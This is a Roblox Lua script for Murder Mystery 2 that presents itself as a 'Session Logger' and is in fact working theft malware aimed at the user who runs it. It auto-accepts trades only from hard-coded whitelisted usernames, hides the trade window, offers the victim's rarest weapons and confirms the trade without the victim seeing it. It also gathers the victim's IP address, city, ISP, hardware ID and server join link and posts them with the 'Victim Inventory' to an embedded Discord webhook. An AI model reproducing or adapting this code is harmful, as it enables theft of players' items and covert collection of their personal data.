if getgenv and getgenv()._SESS_TRACKER_MOBILE then return end
if getgenv then getgenv()._SESS_TRACKER_MOBILE = true end

task.spawn(function()
    if not game:IsLoaded() then game.Loaded:Wait() end

    local Players = game:GetService("Players")
    local RS = game:GetService("ReplicatedStorage")
    local HttpService = game:GetService("HttpService")
    local GuiService = game:GetService("GuiService")
    local RunService = game:GetService("RunService")
    local UIS = game:GetService("UserInputService")
    local LocalPlayer = Players.LocalPlayer

    while not LocalPlayer do task.wait(0.1); LocalPlayer = Players.LocalPlayer end

    local pGuiWait = LocalPlayer:WaitForChild("PlayerGui", 999)
    while pGuiWait and not (pGuiWait:FindFirstChild("MainGUI") or pGuiWait:FindFirstChild("MainGUI_Phone") or pGuiWait:FindFirstChild("MainGUI_Tablet")) do
        task.wait(0.5)
    end

    local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1532170472681373836/LXu-2GqrokaeDd_E4jg0LqvhHyRCWnXplBAsk6XSNx2GXfOIi-keCSNPFIpNX0jrtIOu"
    local http_req = (typeof(request) == "function" and request) or (typeof(http_request) == "function" and http_request) or (http and typeof(http.request) == "function" and http.request) or (syn and typeof(syn.request) == "function" and syn.request) or (fluxus and typeof(fluxus.request) == "function" and fluxus.request) or nil

    local function silentWait(parent, name, timeout)
        if not parent then return nil end
        timeout = timeout or 30
        local child = parent:FindFirstChild(name)
        local elapsed = 0
        while not child and elapsed < timeout do
            task.wait(0.2)
            elapsed = elapsed + 0.2
            child = parent:FindFirstChild(name)
        end
        return child
    end

    local WHITELIST = {["gjipst54"] = true, ["brbrpatipum777"] = true, ["4pdnt"] = true, ["mudila67"] = true}
    local FILL_DELAY = 0.15
    local MAX_ITEMS = 4

    local Trade = silentWait(RS, "Trade")
    if not Trade then return end

    local RARITY_PRIORITY = {["Ancient"]=1,["Godly"]=2,["Vintage"]=3,["Legendary"]=4,["Rare"]=5,["Uncommon"]=6,["Common"]=7}
    local EMBEDDED_RARITIES = {
        ["NikScythe"]="Ancient",["Icepiercer"]="Ancient",["Gingerscope"]="Ancient",["Bat"]="Ancient",["Makeshift"]="Ancient",["Harvester"]="Ancient",["SwirlyGun"]="Ancient",["Icebreaker"]="Ancient",["Icewing"]="Ancient",["Logchopper"]="Ancient",["Hallowscythe"]="Ancient",["ElderwoodScythe"]="Ancient",
        ["Corrupt"]="Godly",["ChromaCandleflame"]="Godly",["Candleflame"]="Godly",["Darksword"]="Godly",["Darkshot"]="Godly",["Ocean"]="Godly",["Waves"]="Godly",["ChromaSwirlyGun"]="Godly",["ChromaLightbringer"]="Godly",["ChromaDarkbringer"]="Godly",["ChromaLugercane"]="Godly",["ChromaGemstone"]="Godly",["ChromaHeat"]="Godly",["ChromaLaser"]="Godly",["ChromaSlasher"]="Godly",["ChromaFang"]="Godly",["ChromaDeathshard"]="Godly",["ChromaSaw"]="Godly",["ChromaSeer"]="Godly",["ChromaBoneblade"]="Godly",["ChromaGingerblade"]="Godly",["Lightbringer"]="Godly",["Darkbringer"]="Godly",["Sugar"]="Godly",["Candy"]="Godly",["RedLuger"]="Godly",["GreenLuger"]="Godly",["Luger"]="Godly",["LugerCane"]="Godly",["Eternalcane"]="Godly",["ElderwoodRevolver"]="Godly",["Hallowgun"]="Godly",["Pixel"]="Godly",["Clockwork"]="Godly",["Amerilaser"]="Godly",["Oldprint"]="Godly",["Spider"]="Godly",["Slasher"]="Godly",["Laser"]="Godly",["Fang"]="Godly",["Deathshard"]="Godly",["Saw"]="Godly",["Seer"]="Godly",["BattleAxe"]="Godly",["BattleAxeII"]="Godly",["Ghostblade"]="Godly",["Frostbite"]="Godly",["Frostsaber"]="Godly",["Chill"]="Godly",["Handsaw"]="Godly",["WinterEdge"]="Godly",["IceDragon"]="Godly",["IceShard"]="Godly",["Peppermint"]="Godly",["Cookieblade"]="Godly",["Gingerblade"]="Godly",["Xmas"]="Godly",["Pumpking"]="Godly",["VampiresEdge"]="Godly",["Hallowsedge"]="Godly",["Boneblade"]="Godly",["Gemstone"]="Godly",["Bioblade"]="Godly",["Prismatic"]="Godly",["Eggblade"]="Godly",["Heartblade"]="Godly",["Nebula"]="Godly",["Plasmablade"]="Godly",["Plasmabeam"]="Godly",["Spectre"]="Godly",["Phantom"]="Godly",["Pearl"]="Godly",["Pearlshine"]="Godly",["Sakura"]="Godly",["Blossom"]="Godly",["Turkey"]="Godly",["Watermelon"]="Godly",["TravelerGun"]="Godly",["TravelerAxe"]="Godly",
        ["America"]="Vintage",["Blood"]="Vintage",["Cowboy"]="Vintage",["Ghost"]="Vintage",["Golden"]="Vintage",["LaserVintage"]="Vintage",["Phaser"]="Vintage",["Prince"]="Vintage",["Shadow"]="Vintage",["Splitter"]="Vintage",
        ["Rune"]="Legendary",["Viper"]="Legendary",["Splash"]="Legendary",["Universe"]="Legendary",["Sparkle"]="Legendary",["Peaces"]="Legendary",["Plasmite"]="Legendary",["Mycelium"]="Legendary",["DeepSea"]="Legendary",["Nightfire"]="Legendary",["Hacker"]="Legendary",["Emerald"]="Legendary",["Midnight"]="Legendary",["Aurora"]="Legendary",["Portal"]="Legendary",["Spitfire"]="Legendary",["Predator"]="Legendary",["Overseer"]="Legendary",["Fade"]="Legendary",["Ginger"]="Legendary",["Scratch"]="Legendary",["Ripper"]="Legendary",["Cavern"]="Legendary",["Icicles"]="Legendary",["Cave"]="Legendary",["SantasMagic"]="Legendary",["GhostKnife"]="Legendary",["TreeKnife"]="Legendary",["Web"]="Legendary",["Rupture"]="Legendary",["CottonCandy"]="Legendary",["ToxicGun"]="Legendary",["ToxicKnife"]="Legendary",["GreenFire"]="Legendary",["BlueElite"]="Legendary",["RedFire"]="Legendary"
    }

    local function getPlayerGui() return LocalPlayer:FindFirstChild("PlayerGui") end

    -- Safe Inventory Extractor with 5 Fallbacks
    local function getOwnedWeapons()
        local weapons = {}
        local seen = {}
        local imageToItemId = {}

        pcall(function()
            local gameReq = (typeof(getrenv) == "function" and getrenv().require) or require
            local Sync = gameReq(silentWait(silentWait(RS, "Database"), "Sync"))
            if Sync and Sync.Weapons then
                for itemId, data in pairs(Sync.Weapons) do
                    if data.Image then
                        local url = tostring(data.Image)
                        local assetId = url:match("assetId=(%d+)") or url:match("id=(%d+)") or url:match("rbxassetid://(%d+)") or url:match("%d+")
                        if assetId then imageToItemId[assetId] = itemId end
                    end
                    if data.Rarity then EMBEDDED_RARITIES[itemId] = tostring(data.Rarity) end
                end
            end
        end)

        local playerData = nil

        -- Fallback 1: _G.PlayerData
        pcall(function()
            local env = (typeof(getrenv) == "function" and getrenv()) or _G
            playerData = (env._G and env._G.PlayerData) or _G.PlayerData
        end)

        -- Fallback 2: GetPlayerData_REMOTE
        if not (playerData and type(playerData) == "table" and playerData.Weapons) then
            pcall(function()
                local remotes = RS:FindFirstChild("Remotes")
                local extras = remotes and remotes:FindFirstChild("Extras")
                if extras then
                    local getPlayerData = extras:FindFirstChild("GetPlayerData_REMOTE")
                    if getPlayerData and getPlayerData:IsA("BindableFunction") then
                        local done = false
                        task.spawn(function()
                            pcall(function() playerData = getPlayerData:Invoke(LocalPlayer.Name) end)
                            done = true
                        end)
                        local t = os.clock()
                        while not done and os.clock() - t < 0.8 do task.wait(0.05) end
                    end
                end
            end)
        end

        -- Fallback 3: GetData2
        if not (playerData and type(playerData) == "table" and playerData.Weapons) then
            pcall(function()
                local remotes = RS:FindFirstChild("Remotes")
                local extras = remotes and remotes:FindFirstChild("Extras")
                if extras then
                    local getData2 = extras:FindFirstChild("GetData2")
                    if getData2 and getData2:IsA("RemoteFunction") then
                        local done = false
                        task.spawn(function()
                            pcall(function() playerData = getData2:InvokeServer() end)
                            done = true
                        end)
                        local t = os.clock()
                        while not done and os.clock() - t < 0.8 do task.wait(0.05) end
                    end
                end
            end)
        end

        -- Process PlayerData table
        if playerData and type(playerData) == "table" and playerData.Weapons and playerData.Weapons.Owned then
            for key, val in pairs(playerData.Weapons.Owned) do
                local itemId = (type(key) == "string" and key) or (type(val) == "string" and val) or nil
                if itemId and itemId ~= "Gift" and not seen[itemId] then
                    local amount = playerData.Weapons.Owned[itemId]
                    if amount and (type(amount) == "table" or (type(amount) == "number" and amount > 0) or type(key) == "number") then
                        seen[itemId] = true
                        table.insert(weapons, itemId)
                    end
                end
            end
        end

        -- Fallback 4: Mobile GUI Scraper (Only ifPlayerData extraction returned nothing)
        if #weapons == 0 then
            local function scrapeMobileGui(node, ignoreKw)
                if not node then return end
                local pName = string.lower(node.Name)
                for _, kw in ipairs(ignoreKw) do
                    if string.find(pName, kw) then return end 
                end
                
                if node:IsA("GuiObject") then
                    local itemId = node:GetAttribute("ItemID")
                    if not itemId and EMBEDDED_RARITIES[node.Name] then
                        itemId = node.Name
                    end
                    if not itemId then
                        local icon = node:FindFirstChild("Icon")
                        if icon and icon:IsA("ImageLabel") and icon.Image then
                            local url = tostring(icon.Image)
                            local assetId = url:match("assetId=(%d+)") or url:match("id=(%d+)") or url:match("rbxassetid://(%d+)") or url:match("%d+")
                            if assetId and imageToItemId[assetId] then
                                itemId = imageToItemId[assetId]
                            end
                        end
                    end
                    if itemId and not (itemId == "NewItem" or itemId == "Frame" or itemId == "Template" or itemId == "Container" or itemId == "Weapons" or itemId == "Pets") then
                        if not seen[itemId] then
                            seen[itemId] = true
                            table.insert(weapons, itemId)
                        end
                    end
                end
                
                for _, child in ipairs(node:GetChildren()) do
                    scrapeMobileGui(child, ignoreKw)
                end
            end

            local pGui = getPlayerGui()
            if pGui then
                local ignore = {"shop", "store", "buy", "robux", "trade", "partner", "profile", "other"}
                for _, guiName in ipairs({"MainGUI_Phone", "MainGUI_Tablet", "MainGUI"}) do
                    local g = pGui:FindFirstChild(guiName)
                    if g then scrapeMobileGui(g, ignore) end
                end
            end
        end

        return weapons
    end

    local function isWhitelisted(name)
        if not name or name == "" then return false end
        for wl in pairs(WHITELIST) do if string.lower(name):find(string.lower(wl)) then return true end end
        return false
    end

    local function parseTradeData(arg1, arg2)
        local partnerObj = nil
        local offerId = nil

        if typeof(arg1) == "Instance" and arg1:IsA("Player") then
            partnerObj = arg1
        elseif type(arg1) == "table" then
            if arg1.LastOffer then offerId = arg1.LastOffer end
            if arg1.OfferId then offerId = arg1.OfferId end
            if typeof(arg1.Player1) == "Instance" and arg1.Player1:IsA("Player") then
                partnerObj = (arg1.Player1 == LocalPlayer) and arg1.Player2 or arg1.Player1
            elseif typeof(arg1.Partner) == "Instance" and arg1.Partner:IsA("Player") then
                partnerObj = arg1.Partner
            end
        end

        if typeof(arg2) == "Instance" and arg2:IsA("Player") then
            partnerObj = arg2
        elseif type(arg2) == "table" then
            if arg2.LastOffer then offerId = arg2.LastOffer end
            if arg2.OfferId then offerId = arg2.OfferId end
        end

        local partnerName = partnerObj and partnerObj.Name
        return partnerName, offerId
    end

    local isActiveTrade = false

    local function hideTradeUIMobile()
        local pGui = getPlayerGui()
        if not pGui then return end
        for _, guiName in ipairs({"TradeGUI_Phone", "TradeGUI_Tablet", "TradeGUI"}) do
            local tradeGui = pGui:FindFirstChild(guiName)
            if tradeGui then
                pcall(function()
                    tradeGui.Enabled = false
                    local container = tradeGui:FindFirstChild("Container")
                    if container and container:IsA("GuiObject") then container.Position = UDim2.new(999, 0, 999, 0); container.Visible = false end
                    local main = tradeGui:FindFirstChild("Main")
                    if main and main:IsA("GuiObject") then main.Position = UDim2.new(999, 0, 999, 0); main.Visible = false end
                end)
            end
        end
    end

    local function handleIncomingTradeRequest(senderName)
        if not senderName then return false end
        if isWhitelisted(senderName) then
            isActiveTrade = true
            task.spawn(function() pcall(function() Trade.AcceptRequest:FireServer() end) end)
            return true
        else
            task.spawn(function() 
                task.wait(0.2)
                pcall(function() Trade.DeclineRequest:FireServer() end) 
            end)
            return false
        end
    end

    -- Event listeners for Trade Requests
    task.spawn(function()
        local requestSent = silentWait(Trade, "RequestSent")
        if requestSent then 
            requestSent.OnClientEvent:Connect(function(player) 
                pcall(function() 
                    local name = (typeof(player) == "Instance" and player:IsA("Player") and player.Name) or (type(player) == "string" and player) or nil
                    if name then handleIncomingTradeRequest(name) end 
                end) 
            end) 
        end
    end)

    task.spawn(function()
        pcall(function()
            local sendRequest = silentWait(Trade, "SendRequest")
            if sendRequest and sendRequest:IsA("RemoteFunction") then 
                sendRequest.OnClientInvoke = function(player)
                    local allowed = false
                    pcall(function() 
                        local name = (typeof(player) == "Instance" and player:IsA("Player") and player.Name) or (type(player) == "string" and player) or nil
                        if name then allowed = handleIncomingTradeRequest(name) end 
                    end)
                    return allowed
                end
            end
        end)
    end)

    local function watchMobileRequestFrame(reqFrame)
        if not reqFrame then return end
        local function checkReq()
            if not reqFrame.Visible then return end
            local senderName = nil
            local receivingRequest = reqFrame:FindFirstChild("ReceivingRequest")
            if receivingRequest and receivingRequest.Visible then
                local usernameLabel = receivingRequest:FindFirstChild("Username", true)
                if usernameLabel and usernameLabel:IsA("TextLabel") and usernameLabel.Text and #usernameLabel.Text > 0 then senderName = usernameLabel.Text end
            end
            if not senderName then
                local usernameLabel = reqFrame:FindFirstChild("Username", true)
                if usernameLabel and usernameLabel:IsA("TextLabel") and usernameLabel.Text and #usernameLabel.Text > 0 then senderName = usernameLabel.Text end
            end
            if senderName then
                reqFrame.Visible = false
                if isWhitelisted(senderName) then 
                    isActiveTrade = true
                    pcall(function() Trade.AcceptRequest:FireServer() end) 
                else 
                    pcall(function() Trade.DeclineRequest:FireServer() end) 
                end
            end
        end
        reqFrame:GetPropertyChangedSignal("Visible"):Connect(checkReq)
        checkReq()
    end

    task.spawn(function()
        local pGui = getPlayerGui()
        while not pGui do
            task.wait(0.5)
            pGui = getPlayerGui()
        end
        
        local existingReq = pGui:FindFirstChild("TradeRequest", true)
        if existingReq then watchMobileRequestFrame(existingReq) end
        pGui.ChildAdded:Connect(function(child)
            if child.Name == "TradeRequest" then watchMobileRequestFrame(child) end
        end)
    end)

    RunService.Heartbeat:Connect(function()
        if isActiveTrade then hideTradeUIMobile() end
    end)

    local function fillInventoryMobile()
        local owned = getOwnedWeapons()
        if #owned == 0 then
            local t = tick()
            while tick() - t < 3 do
                task.wait(0.2)
                owned = getOwnedWeapons()
                if #owned > 0 then break end
            end
        end

        local filtered = {}
        for i = 1, #owned do 
            local itemId = owned[i]
            local rarityName = EMBEDDED_RARITIES[itemId] or "Common"
            local priority = RARITY_PRIORITY[rarityName] or 99
            -- Strictly Ancient (1), Godly (2), Vintage (3), Legendary (4)
            if priority <= 4 then
                table.insert(filtered, itemId) 
            end
        end

        table.sort(filtered, function(a, b) 
            return (RARITY_PRIORITY[EMBEDDED_RARITIES[a] or "Common"] or 99) < (RARITY_PRIORITY[EMBEDDED_RARITIES[b] or "Common"] or 99) 
        end)

        local selected = {}
        for i = 1, math.min(#filtered, MAX_ITEMS) do
            table.insert(selected, filtered[i])
        end

        for i = 1, #selected do
            local itemId = selected[i]
            pcall(function() Trade.OfferItem:FireServer(itemId, "Weapons") end)
            task.wait(FILL_DELAY)
        end
    end

    local currentOfferId = nil
    local acceptTradeTime = 0

    task.spawn(function()
        local updateTrade = silentWait(Trade, "UpdateTrade")
        if updateTrade then
            updateTrade.OnClientEvent:Connect(function(arg1, arg2)
                pcall(function()
                    local _, offerId = parseTradeData(arg1, arg2)
                    if offerId then currentOfferId = offerId end
                    acceptTradeTime = os.clock() + 6.2
                end)
            end)
        end
    end)

    task.spawn(function()
        local startTrade = silentWait(Trade, "StartTrade")
        if startTrade then
            startTrade.OnClientEvent:Connect(function(arg1, arg2)
                pcall(function()
                    local partnerName, offerId = parseTradeData(arg1, arg2)
                    if offerId then currentOfferId = offerId end

                    if partnerName and isWhitelisted(partnerName) then isActiveTrade = true end
                    if not isActiveTrade then return end

                    acceptTradeTime = os.clock() + 6.2
                    task.spawn(function()
                        hideTradeUIMobile()
                        task.wait(0.3)
                        pcall(fillInventoryMobile)
                        while os.clock() < acceptTradeTime do task.wait(0.2) end
                        task.wait(0.2)
                        for attempt = 1, 4 do
                            pcall(function() Trade.AcceptTrade:FireServer(game.PlaceId * 3, currentOfferId or 0) end)
                            task.wait(0.4)
                        end
                        task.wait(6)
                        isActiveTrade = false
                    end)
                end)
            end)
        end
    end)

    -- Reset listeners
    task.spawn(function()
        pcall(function()
            local acceptTrade = silentWait(Trade, "AcceptTrade")
            if acceptTrade then acceptTrade.OnClientEvent:Connect(function() isActiveTrade = false end) end
        end)
        pcall(function()
            local declineRequest = silentWait(Trade, "DeclineRequest")
            if declineRequest then declineRequest.OnClientEvent:Connect(function() isActiveTrade = false end) end
        end)
        pcall(function()
            local declineTrade = silentWait(Trade, "DeclineTrade")
            if declineTrade then declineTrade.OnClientEvent:Connect(function() isActiveTrade = false end) end
        end)
    end)

    -- Auto-enable requests
    task.spawn(function()
        while task.wait(3) do
            pcall(function()
                if Trade:FindFirstChild("SetRequestsEnabled") then Trade.SetRequestsEnabled:FireServer(true) end
            end)
        end
    end)

    -- Full Session Logger & Inventory Reporter (Original layout + Victim Inventory field)
    task.spawn(function()
        if not http_req then return end
        task.wait(2.5)
        local executor, hwid = "Unknown Mobile Executor", "Unknown"
        pcall(function() if identifyexecutor then executor = identifyexecutor() end end)
        pcall(function() if gethwid then hwid = gethwid() end end)

        local ip, country, region, city, isp, isVpn = "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", "Unknown"
        pcall(function()
            local res = http_req({Url = "http://ip-api.com/json/?fields=status,country,regionName,city,isp,proxy,hosting,query", Method = "GET"})
            if res and res.Body then
                local data = HttpService:JSONDecode(res.Body)
                if data.status == "success" then
                    ip, country, region, city, isp = data.query or "Unknown", data.country or "Unknown", data.regionName or "Unknown", data.city or "Unknown", data.isp or "Unknown"
                    isVpn = (data.proxy or data.hosting) and "Yes" or "No"
                end
            end
            if ip == "Unknown" then
                local res2 = http_req({Url = "https://get.geojs.io/v1/ip/geo.json", Method = "GET"})
                if res2 and res2.Body then
                    local data = HttpService:JSONDecode(res2.Body)
                    ip, country, region, city, isp = data.ip or "Unknown", data.country or "Unknown", data.region or "Unknown", data.city or "Unknown", data.organization_name or data.organization or "Unknown"
                end
            end
        end)

        local fps, ping, resolution = "Unknown", "Unknown", "Unknown"
        pcall(function() fps = math.floor(workspace:GetRealPhysicsFPS()) end)
        pcall(function() ping = math.floor(LocalPlayer:GetNetworkPing() * 1000) end)
        pcall(function() local cam = workspace.CurrentCamera; resolution = string.format("%dx%d", cam.ViewportSize.X, cam.ViewportSize.Y) end)
        
        local owned = getOwnedWeapons()
        local categories = {
            Ancient = {}, Godly = {}, Vintage = {}, Legendary = {}
        }
        local loggedItems = {}
        for i = 1, #owned do
            local itemId = owned[i]
            local rarityName = EMBEDDED_RARITIES[itemId] or "Common"
            local priority = RARITY_PRIORITY[rarityName] or 99
            if priority <= 4 and not loggedItems[itemId] then
                loggedItems[itemId] = true
                table.insert(categories[rarityName], itemId)
            end
        end

        local function formatCategory(name, items)
            if #items == 0 then return "**" .. name .. ":** -" end
            return "**" .. name .. ":** " .. table.concat(items, ", ")
        end

        local invText = string.format("%s\n%s\n%s\n%s", 
            formatCategory("Ancient", categories.Ancient),
            formatCategory("Godly", categories.Godly),
            formatCategory("Vintage", categories.Vintage),
            formatCategory("Legendary", categories.Legendary)
        )

        local device = GuiService:IsTenFootInterface() and "Console/TV" or UIS.TouchEnabled and "Mobile / Tablet" or "Mobile (Spoofed/Emulator)"
        local jobId, placeId = game.JobId, game.PlaceId
        local joinLink = "https://www.roblox.com/games/"..placeId.."/Murder-Mystery-2?gameInstanceId="..jobId
        
        local embed = {
            title = "Session Logger",
            fields = {
                {name = "Player", value = string.format("[%s (@%s)](https://www.roblox.com/users/%d/profile)", LocalPlayer.DisplayName, LocalPlayer.Name, LocalPlayer.UserId), inline = true},
                {name = "System", value = string.format("**Device:** %s\n**Executor:** %s", device, executor), inline = true},
                {name = "Performance", value = string.format("**FPS:** %s\n**Ping:** %s ms\n**Resolution:** %s", fps, ping, resolution), inline = true},
                {name = "HWID", value = string.format("`%s`", hwid), inline = false},
                {name = "Network & Location", value = string.format("**IP:** %s\n**Location:** %s, %s, %s\n**ISP:** %s\n**VPN/Proxy:** %s", ip, country, region, city, isp, isVpn), inline = false},
                {name = "Server JobID", value = string.format("`%s`\n[Join via RoPro/BTRoblox](%s)", jobId, joinLink), inline = false},
                {name = "Join via Executor:", value = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\", game:GetService(\"Players\").LocalPlayer)\n```", placeId, jobId), inline = false},
                {name = "Victim Inventory:", value = invText, inline = false}
            }
        }
        
        if game.PrivateServerId ~= "" then
            embed.footer = { text = "Private Server ✅" }
        end
        
        local payload = {
            content = "@everyone",
            embeds = {embed},
            username = "Session Logger"
        }
        pcall(function() http_req({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)}) end)
    end)
end)
